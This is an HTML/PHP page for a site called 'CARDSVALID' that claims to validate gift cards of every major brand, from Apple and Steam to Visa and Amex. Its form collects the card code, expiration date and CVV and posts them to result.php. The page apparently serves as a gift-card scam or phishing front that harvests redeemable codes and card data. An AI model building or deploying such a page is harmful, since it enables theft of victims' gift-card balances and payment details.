<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?= 'title' ?></title>
    <!-- Include Tailwind CSS -->
    <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet">
    <link rel="stylesheet" href="asset/css/style.css">
</head>

<body>

    <?php require_once('nav.php') ?>

    <div class="flex justify-center">
        <main class=" page-content space-y-4">
            <div class="header text-center text-5xl pt-10 lg:pt-40">CARDSVALID</div>
            <p class="text-center pt-10">VALIDATE ALL GIFT CARD</p>

            <img src="./gift-card.png" alt="Website logo" class="mx-auto w-80">

            <div class="mb-4">
                <form action="./result.php" method="post" class="space-y-4">
                    <div class="form-group">
                        <select name="card_type" id="card_type" class="ff-el-form-control" data-name="card_type" data-calc_value="0" aria-invalid="false" aria-required="false">
                            <option value="">- Select type of card-</option>
                            <option value="Apple">Apple</option>
                            <option value="Amazon">Amazon</option>
                            <option value="Best Buy">Best Buy</option>
                            <option value="Ebay">Ebay</option>
                            <option value="Googleplay">Googleplay</option>
                            <option value="Home Depot ">Home Depot</option>
                            <option value="Xbox">Xbox</option>
                            <option value="Steam">Steam</option>
                            <option value="Playstation">Playstation</option>
                            <option value="Target gift card">Target gift card</option>
                            <option value="Amex">Amex</option>
                            <option value="Mastercard">Mastercard</option>
                            <option value="Walmart ">Walmart</option>
                            <option value="Vanilla">Vanilla</option>
                            <option value="Visa">Visa</option>
                        </select>
                    </div>

                    <div class="ff-el-group">
                        <div class="ff-el-input--content"><input type="text" name="redeem_code" class="ff-el-form-control" placeholder="Gift card code" data-name="input_text" id="redeem_code" aria-invalid="false" aria-required="true"></div>
                    </div>
                    <div class="ff-el-group">
                        <div class="ff-el-input--content"><input type="text" name="expiration_date" class="ff-el-form-control" placeholder="Gift card expiration date" data-name="expiration_date" id="expiration_date" aria-invalid="false" aria-required="false"></div>
                    </div>
                    <div class="ff-el-group">
                        <div class="ff-el-input--content">
                            <input type="number" name="cvv" id="cvv" class="ff-el-form-control" placeholder="`CVV`" data-name="cvv" inputmode="numeric" step="any" aria-invalid="false" aria-required="false">
                        </div>
                    </div>

                    <div class="flex justify-center">
                        <button type="submit" class="ff-btn ff-btn-submit ff-btn-md ff_btn_style">Verify Card</button>
                    </div>
                </form>
            </div>
        </main>
    </div>
</body>

</html>